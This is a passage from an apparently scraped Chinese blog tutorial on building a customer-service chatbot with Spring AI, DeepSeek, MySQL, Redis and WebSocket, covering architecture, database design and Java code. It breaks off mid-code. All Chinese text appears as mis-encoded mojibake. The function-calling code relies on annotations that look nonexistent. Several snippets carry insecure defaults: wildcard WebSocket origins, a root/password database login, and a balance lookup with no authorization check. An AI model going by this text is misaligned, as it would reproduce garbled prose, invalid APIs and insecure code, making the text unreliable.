<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d588a3c4dd774b14a4a0b07bbe8d6954~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768451048&amp;x-signature=e9KukJPFVBEBwmgDasbMcu%2Bvasg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">äºŒã€Spring AI 1.0æ¦‚è¿°</h3>
<h4 data-id="heading-3">2.1 ä»€ä¹ˆæ˜¯Spring AI</h4>
<p>Spring AIæ˜¯ä¸€ä¸ªä¸ºAIå·¥ç¨‹åº”ç”¨è®¾è®¡çš„æ¡†æ¶ï¼Œå®ƒç»§æ‰¿äº†Springç”Ÿæ€ç³»ç»Ÿçš„æ ¸å¿ƒç†å¿µâ€”â€”å¯ç§»æ¤æ€§ã€æ¨¡å—åŒ–å’Œå¯æ‰©å±•æ€§ã€‚Spring AIæä¾›äº†ï¼š</p>
<ul>
<li><strong>ç»Ÿä¸€çš„APIæ¥å£</strong>ï¼šæ”¯æŒå¤šç§AIæ¨¡å‹æä¾›å•†</li>
<li><strong>æç¤ºè¯æ¨¡æ¿ç®¡ç†</strong>ï¼šç®€åŒ–æç¤ºè¯çš„æ„å»ºå’Œç‰ˆæœ¬æ§åˆ¶</li>
<li><strong>å‡½æ•°è°ƒç”¨èƒ½åŠ›</strong>ï¼šè®©LLMèƒ½å¤Ÿè°ƒç”¨å¤–éƒ¨æœåŠ¡å’Œå·¥å…·</li>
<li><strong>å‘é‡æ•°æ®åº“é›†æˆ</strong>ï¼šæ”¯æŒRAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æ¶æ„</li>
<li><strong>æµå¼å“åº”æ”¯æŒ</strong>ï¼šæä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ</li>
</ul>
<h4 data-id="heading-4">2.2 æ ¸å¿ƒç»„ä»¶</h4>
<p>Spring AIä¸»è¦ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒç»„ä»¶æ„æˆï¼š</p>
<ol>
<li><strong>ChatClient</strong>ï¼šä¸LLMè¿›è¡Œå¯¹è¯çš„ä¸»è¦æ¥å£</li>
<li><strong>Prompt Manager</strong>ï¼šç®¡ç†å’Œç»„ç»‡æç¤ºè¯æ¨¡æ¿</li>
<li><strong>Function Calling</strong>ï¼šå‡½æ•°è°ƒç”¨æœºåˆ¶</li>
<li><strong>Vector Store</strong>ï¼šå‘é‡å­˜å‚¨æŠ½è±¡å±‚</li>
<li><strong>Embedding Model</strong>ï¼šæ–‡æœ¬å‘é‡åŒ–æ¥å£</li>
</ol>
<h4 data-id="heading-5">2.3 æŠ€æœ¯æ ˆé€‰å‹</h4>
<p>æœ¬å®ä¾‹é‡‡ç”¨ä»¥ä¸‹æŠ€æœ¯æ ˆï¼š</p>
<ul>
<li><strong>Spring Boot 3.2</strong>ï¼šç°ä»£åŒ–Javaåº”ç”¨å¼€å‘æ¡†æ¶</li>
<li><strong>Spring AI 1.0</strong>ï¼šAIé›†æˆæ¡†æ¶</li>
<li><strong>DeepSeek API</strong>ï¼šå›½äº§é«˜æ€§èƒ½å¤§è¯­è¨€æ¨¡å‹</li>
<li><strong>MySQL 8.0</strong>ï¼šå…³ç³»å‹æ•°æ®åº“</li>
<li><strong>Redis</strong>ï¼šç¼“å­˜å’Œä¼šè¯ç®¡ç†</li>
<li><strong>WebSocket</strong>ï¼šå®æ—¶é€šä¿¡åè®®</li>
</ul>
<h3 data-id="heading-6">ä¸‰ã€ç³»ç»Ÿæ¶æ„è®¾è®¡</h3>
<h4 data-id="heading-7">3.1 æ•´ä½“æ¶æ„</h4>
<p>æˆ‘ä»¬çš„æ™ºèƒ½å®¢æœç³»ç»Ÿé‡‡ç”¨åˆ†å±‚æ¶æ„è®¾è®¡ï¼Œç¡®ä¿ç³»ç»Ÿçš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42849ef64e104fffbff2333083445751~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768451048&amp;x-signature=6PbljXmcv5UG%2Fhgt0DkEPK4eOdM%3D" alt="" loading="lazy"/></p>
<p><strong>æ¶æ„è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>è¡¨ç°å±‚ï¼ˆPresentation Layerï¼‰</strong>ï¼šæä¾›Webç•Œé¢å’ŒAPIæ¥å£</li>
<li><strong>åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰</strong>ï¼šå®ç°ä¸šåŠ¡é€»è¾‘å’ŒAIå¯¹è¯ç®¡ç†</li>
<li><strong>é¢†åŸŸå±‚ï¼ˆDomain Layerï¼‰</strong>ï¼šæ ¸å¿ƒä¸šåŠ¡æ¨¡å‹å’Œè§„åˆ™</li>
<li><strong>åŸºç¡€è®¾æ–½å±‚ï¼ˆInfrastructure Layerï¼‰</strong>ï¼šå¤–éƒ¨æœåŠ¡é›†æˆå’Œæ•°æ®æŒä¹…åŒ–</li>
<li><strong>AIæœåŠ¡å±‚ï¼ˆAI Service Layerï¼‰</strong>ï¼šSpring AIä¸DeepSeekçš„é›†æˆ</li>
</ul>
<h4 data-id="heading-8">3.2 æ ¸å¿ƒæ¨¡å—åˆ’åˆ†</h4>
<p>ç³»ç»ŸåŒ…å«ä»¥ä¸‹æ ¸å¿ƒæ¨¡å—ï¼š</p>
<ol>
<li><strong>å¯¹è¯ç®¡ç†æ¨¡å—</strong>ï¼šç®¡ç†ç”¨æˆ·ä¼šè¯å’Œå¯¹è¯å†å²</li>
<li><strong>çŸ¥è¯†åº“æ¨¡å—</strong>ï¼šå­˜å‚¨å’Œç®¡ç†ä¼ä¸šçŸ¥è¯†æ–‡æ¡£</li>
<li><strong>æ„å›¾è¯†åˆ«æ¨¡å—</strong>ï¼šç†è§£ç”¨æˆ·éœ€æ±‚å¹¶åˆ†ç±»</li>
<li><strong>æ¶ˆæ¯è·¯ç”±æ¨¡å—</strong>ï¼šå°†ç”¨æˆ·è¯·æ±‚åˆ†å‘åˆ°åˆé€‚çš„å¤„ç†å•å…ƒ</li>
<li><strong>ç›‘æ§ç»Ÿè®¡æ¨¡å—</strong>ï¼šè·Ÿè¸ªç³»ç»Ÿæ€§èƒ½å’Œç”¨æˆ·æ»¡æ„åº¦</li>
</ol>
<h3 data-id="heading-9">å››ã€ç³»ç»Ÿé›†æˆæµç¨‹</h3>
<h4 data-id="heading-10">4.1 ç³»ç»Ÿäº¤äº’æµç¨‹</h4>
<p>ç”¨æˆ·ä¸æ™ºèƒ½å®¢æœç³»ç»Ÿçš„äº¤äº’éµå¾ªä¸€ä¸ªæ¸…æ™°çš„å¤„ç†æµç¨‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94734ab095cc434797024d93f08d8a58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768451048&amp;x-signature=lWYYTkLrYEyXBWW8H%2BuDyxMqXYk%3D" alt="" loading="lazy"/></p>
<p><strong>äº¤äº’æ­¥éª¤è¯´æ˜ï¼š</strong></p>
<ol>
<li>ç”¨æˆ·å‘èµ·å¯¹è¯è¯·æ±‚</li>
<li>ç³»ç»ŸéªŒè¯ç”¨æˆ·èº«ä»½å¹¶åŠ è½½å†å²ä¼šè¯</li>
<li>æ„å›¾è¯†åˆ«æ¨¡å—åˆ†æç”¨æˆ·è¾“å…¥</li>
<li>æ ¹æ®æ„å›¾ç±»å‹é€‰æ‹©å¤„ç†ç­–ç•¥ï¼š
<ul>
<li>ç®€å•é—®ç­”ï¼šç›´æ¥ä»çŸ¥è¯†åº“æ£€ç´¢</li>
<li>å¤æ‚é—®é¢˜ï¼šé€šè¿‡RAGå¢å¼ºåè°ƒç”¨LLM</li>
<li>ç‰¹å®šæ“ä½œï¼šè§¦å‘å‡½æ•°è°ƒç”¨</li>
</ul>
</li>
<li>DeepSeekæ¨¡å‹ç”Ÿæˆå“åº”</li>
<li>ç³»ç»Ÿå¤„ç†å¹¶æ ¼å¼åŒ–å“åº”ç»“æœ</li>
<li>æµå¼è¿”å›ç»™ç”¨æˆ·</li>
<li>ä¿å­˜å¯¹è¯è®°å½•åˆ°æ•°æ®åº“</li>
</ol>
<h4 data-id="heading-11">4.2 æ•°æ®æµè½¬</h4>
<p>ç³»ç»Ÿä¸­çš„æ•°æ®æµè½¬è·¯å¾„æ¸…æ™°ï¼š</p>
<ul>
<li><strong>è¾“å…¥æ•°æ®æµ</strong>ï¼šç”¨æˆ·æ¶ˆæ¯ â†’ WebSocket â†’ æ¶ˆæ¯å¤„ç†å™¨ â†’ AIæœåŠ¡</li>
<li><strong>çŸ¥è¯†æ£€ç´¢æµ</strong>ï¼šç”¨æˆ·æŸ¥è¯¢ â†’ å‘é‡åŒ– â†’ å‘é‡æ•°æ®åº“ â†’ ç›¸ä¼¼æ–‡æ¡£æ£€ç´¢</li>
<li><strong>è¾“å‡ºæ•°æ®æµ</strong>ï¼šLLMå“åº” â†’ æ ¼å¼åŒ– â†’ WebSocket â†’ ç”¨æˆ·ç•Œé¢</li>
</ul>
<h3 data-id="heading-12">äº”ã€æ•°æ®åº“è®¾è®¡</h3>
<h4 data-id="heading-13">5.1 æ•°æ®åº“è¡¨ç»“æ„</h4>
<p>åˆç†çš„æ•°æ®åº“è®¾è®¡æ˜¯ç³»ç»Ÿç¨³å®šè¿è¡Œçš„åŸºç¡€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3aee9675be24bfdab6a0939bdc9c195~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768451048&amp;x-signature=XvK3i75EQmlcU4jppeBZV0Ymrfk%3D" alt="" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒè¡¨è¯´æ˜ï¼š</strong></p>
<ol>
<li>
<p><strong>conversationsï¼ˆä¼šè¯è¡¨ï¼‰</strong></p>
<ul>
<li>å­˜å‚¨ç”¨æˆ·ä¼šè¯åŸºæœ¬ä¿¡æ¯</li>
<li>åŒ…å«ä¼šè¯çŠ¶æ€ã€åˆ›å»ºæ—¶é—´ç­‰å­—æ®µ</li>
<li>æ”¯æŒå¤šè½®å¯¹è¯çš„å…³è”</li>
</ul>
</li>
<li>
<p><strong>messagesï¼ˆæ¶ˆæ¯è¡¨ï¼‰</strong></p>
<ul>
<li>è®°å½•æ‰€æœ‰å¯¹è¯æ¶ˆæ¯</li>
<li>åŒºåˆ†ç”¨æˆ·æ¶ˆæ¯å’ŒAIå“åº”</li>
<li>å­˜å‚¨æ¶ˆæ¯å…ƒæ•°æ®ï¼ˆtokensã€è€—æ—¶ç­‰ï¼‰</li>
</ul>
</li>
<li>
<p><strong>knowledge_baseï¼ˆçŸ¥è¯†åº“è¡¨ï¼‰</strong></p>
<ul>
<li>å­˜å‚¨ä¼ä¸šçŸ¥è¯†æ–‡æ¡£</li>
<li>åŒ…å«æ–‡æ¡£åˆ†ç±»å’Œæ ‡ç­¾</li>
<li>æ”¯æŒå…¨æ–‡æ£€ç´¢</li>
</ul>
</li>
<li>
<p><strong>user_feedbackï¼ˆç”¨æˆ·åé¦ˆè¡¨ï¼‰</strong></p>
<ul>
<li>æ”¶é›†ç”¨æˆ·å¯¹AIå›å¤çš„è¯„ä»·</li>
<li>ç”¨äºæŒç»­æ”¹è¿›ç³»ç»Ÿ</li>
</ul>
</li>
</ol>
<h4 data-id="heading-14">5.2 å…³é”®ç´¢å¼•è®¾è®¡</h4>
<p>ä¸ºæå‡æŸ¥è¯¢æ€§èƒ½ï¼Œæˆ‘ä»¬åœ¨ä»¥ä¸‹å­—æ®µä¸Šå»ºç«‹ç´¢å¼•ï¼š</p>
<ul>
<li>messagesè¡¨çš„conversation_idå­—æ®µ</li>
<li>messagesè¡¨çš„created_atå­—æ®µ</li>
<li>knowledge_baseè¡¨çš„categoryå’Œtagså­—æ®µ</li>
<li>user_feedbackè¡¨çš„ratingå­—æ®µ</li>
</ul>
<h3 data-id="heading-15">å…­ã€æ ¸å¿ƒä»£ç å®ç°</h3>
<h4 data-id="heading-16">6.1 é¡¹ç›®åˆå§‹åŒ–</h4>
<p>é¦–å…ˆï¼Œåˆ›å»ºSpring Booté¡¹ç›®å¹¶æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring AI dependency --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-openai-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Database --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Redis --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- WebSocket --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h4 data-id="heading-17">6.2 é…ç½®DeepSeek API</h4>
<p>åœ¨application.ymlä¸­é…ç½®DeepSeek APIï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">ai:</span>
    <span class="hljs-attr">openai:</span>
      <span class="hljs-attr">api-key:</span> <span class="hljs-string">${DEEPSEEK_API_KEY}</span>
      <span class="hljs-attr">base-url:</span> <span class="hljs-string">https://api.deepseek.com/v1</span>
      <span class="hljs-attr">chat:</span>
        <span class="hljs-attr">options:</span>
          <span class="hljs-attr">model:</span> <span class="hljs-string">deepseek-chat</span>
          <span class="hljs-attr">temperature:</span> <span class="hljs-number">0.7</span>
          <span class="hljs-attr">max-tokens:</span> <span class="hljs-number">2000</span>

  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/customer_service</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">password</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>

  <span class="hljs-attr">jpa:</span>
    <span class="hljs-attr">hibernate:</span>
      <span class="hljs-attr">ddl-auto:</span> <span class="hljs-string">update</span>
    <span class="hljs-attr">show-sql:</span> <span class="hljs-literal">true</span>

  <span class="hljs-attr">data:</span>
    <span class="hljs-attr">redis:</span>
      <span class="hljs-attr">host:</span> <span class="hljs-string">localhost</span>
      <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
</code></pre>
<h4 data-id="heading-18">6.3 åˆ›å»ºAIæœåŠ¡å±‚</h4>
<p>å®ç°AIå¯¹è¯æœåŠ¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConversationRepository conversationRepository;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MessageRepository messageRepository;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KnowledgeBaseService knowledgeBaseService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChatService</span><span class="hljs-params">(ChatClient.Builder chatClientBuilder,
                      ConversationRepository conversationRepository,
                      MessageRepository messageRepository,
                      KnowledgeBaseService knowledgeBaseService)</span> {
        <span class="hljs-built_in">this</span>.chatClient = chatClientBuilder.build();
        <span class="hljs-built_in">this</span>.conversationRepository = conversationRepository;
        <span class="hljs-built_in">this</span>.messageRepository = messageRepository;
        <span class="hljs-built_in">this</span>.knowledgeBaseService = knowledgeBaseService;
    }

    <span class="hljs-comment">/**
     * å¤„ç†ç”¨æˆ·æ¶ˆæ¯å¹¶è¿”å›AIå“åº”
     */</span>
    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat</span><span class="hljs-params">(String userId, String sessionId, String userMessage)</span> {
        log.info(<span class="hljs-string">"ç”¨æˆ· {} åœ¨ä¼šè¯ {} ä¸­å‘é€æ¶ˆæ¯: {}"</span>, userId, sessionId, userMessage);

        <span class="hljs-comment">// ä¿å­˜ç”¨æˆ·æ¶ˆæ¯</span>
        saveMessage(sessionId, <span class="hljs-string">"USER"</span>, userMessage);

        <span class="hljs-comment">// æ£€ç´¢ç›¸å…³çŸ¥è¯†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> knowledgeBaseService.searchRelevantContent(userMessage);

        <span class="hljs-comment">// æ„å»ºæç¤ºè¯</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> buildPrompt(userMessage, context);

        <span class="hljs-comment">// è°ƒç”¨AIæ¨¡å‹å¹¶æµå¼è¿”å›</span>
        <span class="hljs-keyword">return</span> chatClient.prompt()
                .user(prompt)
                .stream()
                .content()
                .doOnNext(response -&gt; {
                    log.debug(<span class="hljs-string">"AIå“åº”ç‰‡æ®µ: {}"</span>, response);
                })
                .doOnComplete(() -&gt; {
                    log.info(<span class="hljs-string">"ä¼šè¯ {} çš„AIå“åº”å®Œæˆ"</span>, sessionId);
                })
                .doOnError(error -&gt; {
                    log.error(<span class="hljs-string">"AIè°ƒç”¨å‡ºé”™"</span>, error);
                });
    }

    <span class="hljs-comment">/**
     * æ„å»ºæç¤ºè¯æ¨¡æ¿
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">buildPrompt</span><span class="hljs-params">(String userMessage, String context)</span> {
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"""
            ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å®¢æœåŠ©æ‰‹ï¼Œè´Ÿè´£å›ç­”ç”¨æˆ·çš„é—®é¢˜ã€‚

            ã€ç›¸å…³çŸ¥è¯†ã€‘
            %s

            ã€ç”¨æˆ·é—®é¢˜ã€‘
            %s

            è¯·åŸºäºä¸Šè¿°çŸ¥è¯†å›ç­”ç”¨æˆ·é—®é¢˜ã€‚å¦‚æœçŸ¥è¯†åº“ä¸­æ²¡æœ‰ç›¸å…³ä¿¡æ¯ï¼Œè¯·è¯šå®åœ°å‘ŠçŸ¥ç”¨æˆ·ï¼Œå¹¶å°½å¯èƒ½æä¾›å»ºè®¾æ€§çš„å¸®åŠ©ã€‚

            æ³¨æ„äº‹é¡¹ï¼š
            1. å›ç­”è¦å‡†ç¡®ã€ä¸“ä¸šã€å‹å¥½
            2. é¿å…æä¾›ä¸ç¡®å®šçš„ä¿¡æ¯
            3. å¦‚æœæ¶‰åŠå…·ä½“æ“ä½œï¼Œè¯·æä¾›è¯¦ç»†æ­¥éª¤
            4. ä¿æŒå¯¹è¯çš„è¿è´¯æ€§
            """</span>, context, userMessage);
    }

    <span class="hljs-comment">/**
     * ä¿å­˜æ¶ˆæ¯åˆ°æ•°æ®åº“
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveMessage</span><span class="hljs-params">(String sessionId, String role, String content)</span> {
        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();
        message.setSessionId(sessionId);
        message.setRole(role);
        message.setContent(content);
        message.setTimestamp(LocalDateTime.now());
        messageRepository.save(message);
    }
}
</code></pre>
<h4 data-id="heading-19">6.4 å®ç°å‡½æ•°è°ƒç”¨</h4>
<p>Spring AI 1.0æ”¯æŒå‡½æ•°è°ƒç”¨ï¼Œè®©AIèƒ½å¤Ÿæ‰§è¡Œç‰¹å®šæ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerServiceFunctions</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserRepository userRepository;

    <span class="hljs-comment">/**
     * æŸ¥è¯¢è®¢å•çŠ¶æ€
     */</span>
    <span class="hljs-meta">@FunctionInfo(
        description = "æŸ¥è¯¢ç”¨æˆ·çš„è®¢å•çŠ¶æ€",
        name = "queryOrderStatus"
    )</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">queryOrderStatus</span><span class="hljs-params">(<span class="hljs-meta">@FunctionParam(description = "è®¢å•å·")</span> String orderId)</span> {
        log.info(<span class="hljs-string">"æŸ¥è¯¢è®¢å•çŠ¶æ€: {}"</span>, orderId);
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderRepository.findById(orderId)
            .orElse(<span class="hljs-literal">null</span>);

        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"è®¢å•ä¸å­˜åœ¨"</span>;
        }

        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"è®¢å• %s çš„çŠ¶æ€æ˜¯: %sï¼Œé¢„è®¡ %s é€è¾¾"</span>,
            orderId, order.getStatus(), order.getEstimatedDelivery());
    }

    <span class="hljs-comment">/**
     * æŸ¥è¯¢ç”¨æˆ·ä½™é¢
     */</span>
    <span class="hljs-meta">@FunctionInfo(
        description = "æŸ¥è¯¢ç”¨æˆ·è´¦æˆ·ä½™é¢",
        name = "queryUserBalance"
    )</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">queryUserBalance</span><span class="hljs-params">(<span class="hljs-meta">@FunctionParam(description = "ç”¨æˆ·ID")</span> String userId)</span> {
        log.info(<span class="hljs-string">"æŸ¥è¯¢ç”¨æˆ·ä½™é¢: {}"</span>, userId);
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userRepository.findById(userId)
            .orElse(<span class="hljs-literal">null</span>);

        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨"</span>;
        }

        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"æ‚¨çš„è´¦æˆ·ä½™é¢ä¸º: %.2f å…ƒ"</span>, user.getBalance());
    }
}
</code></pre>
<p>åœ¨ChatServiceä¸­å¯ç”¨å‡½æ•°è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chatWithFunctions</span><span class="hljs-params">(String userId, String sessionId, String userMessage)</span> {
    <span class="hljs-keyword">return</span> chatClient.prompt()
            .user(userMessage)
            .functions(<span class="hljs-string">"queryOrderStatus"</span>, <span class="hljs-string">"queryUserBalance"</span>) <span class="hljs-comment">// æ³¨å†Œå‡½æ•°</span>
            .stream()
            .content();
}
</code></pre>
<h4 data-id="heading-20">6.5 WebSocketå®æ—¶é€šä¿¡</h4>
<p>å®ç°WebSocketç«¯ç‚¹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSocket</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebSocketConfigurer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ChatWebSocketHandler chatWebSocketHandler;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerWebSocketHandlers</span><span class="hljs-params">(WebSocketHandlerRegistry registry)</span> {
        registry.addHandler(chatWebSocketHandler, <span class="hljs-string">"/ws/chat"</span>)
                .setAllowedOrigins(<span class="hljs-string">"*"</span>);
    }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatWebSocketHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TextWebSocketHandler</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ChatService chatService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTextMessage</span><span class="hljs-params">(WebSocketSession session, TextMessage message)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> message.getPayload();
        <span class="hljs-type">ChatRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> parseRequest(payload);

        <span class="hljs-comment">// æµå¼å‘é€AIå“åº”</span>
        chatService.chat(request.getUserId(), request.getSessionId(), request.getMessage())
                .doOnNext(response -&gt; {
                    <span class="hljs-keyword">try</span> {
                        session.sendMessage(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextMessage</span>(response));
                    } <span class="hljs-keyword">catch</span> (IOException e) {
                        log.error(<span class="hljs-string">"å‘é€æ¶ˆæ¯å¤±è´¥"</span>, e);
                    }
                })
                .subscribe();
    }
}
</code></pre>
<h4 data-id="heading-21">6.6 çŸ¥è¯†åº“å‘é‡æ£€ç´¢</h4>
<p>å®ç°åŸºäºå‘é‡ç›¸ä¼¼åº¦çš„çŸ¥è¯†æ£€ç´¢ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
